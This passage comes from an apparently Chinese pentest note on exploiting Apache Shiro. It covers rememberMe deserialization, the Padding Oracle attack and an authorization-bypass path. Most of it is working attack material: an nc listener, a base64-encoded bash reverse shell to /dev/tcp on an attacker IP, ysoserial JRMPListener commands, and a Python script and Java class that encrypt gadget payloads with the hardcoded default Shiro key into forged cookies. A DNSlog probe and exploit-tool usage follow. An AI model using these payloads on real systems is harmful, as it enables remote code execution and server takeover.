  #### Shiro rememberMe反序列化漏洞
	Shiro相关转自bypass公众号
	https://github.com/insightglacier/Shiro_exploit
	python shiro_exploit.py -u http://192.168.172.129:8080
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/828.png)

	通过获取到的key，常见的漏洞利用方式有两种：反弹shell和写入文件。
	反弹shell
	监听本地端口
	nc -lvp 1234
	Java Runtime 配合 bash 编码，在线编码地址：
	http://www.jackson-t.ca/runtime-exec-payloads.html
	将bash -i >& /dev/tcp/192.168.172.133/1234 0>&1编码
	bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
	通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令
	java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
	使用shiro.py 生成Payload
	python shiro.py 192.168.172.133:6666
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/829.png)

	shiro.py代码如下
```python
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)    
BS = AES.block_size    
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")    
iv = uuid.uuid4().bytes    
encryptor = AES.new(key, AES.MODE_CBC, iv)    
file_body = pad(popen.stdout.read())    
base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    
return base64_ciphertext
if __name__ == '__main__':
   payload = encode_rememberme(sys.argv[1])
   print "rememberMe={0}".format(payload.decode())
```
	构造数据包，伪造cookie，发送Payload。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/830.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/831.png)

	写入文件
	生成poc.ser文件
	sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser
	使用Shiro内置的默认密钥对Payload进行加密：
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/832.png)
```java
package shiro;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.DefaultSerializer;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;
public class TestRemember {
public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("d://poc.ser"));
        	AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
        ByteSource ciphertext = aes.encrypt(payloads, key);        System.out.printf(ciphertext.toString());    }}
```
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/833.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/834.png)
  #### Shiro Padding Oracle Attack
	登录Shiro网站，从cookie中获得rememberMe字段的值
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/835.png)

	利用DNSlog探测，通过ysoserial工具payload。
	java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ping 75bbot.dnslog.cn" > payload.class
	使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。
	java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath
	https://github.com/longofo/PaddingOracleAttack-Shiro-721
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/836.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/837.png)
	
	使用构造的rememberMe攻击字符串重新请求网站
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/838.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/839.png)

	一键自动化漏洞利用工具
	https://github.com/feihong-cs/ShiroExploit
  #### shiro权限绕过
	/;/test/admin/page
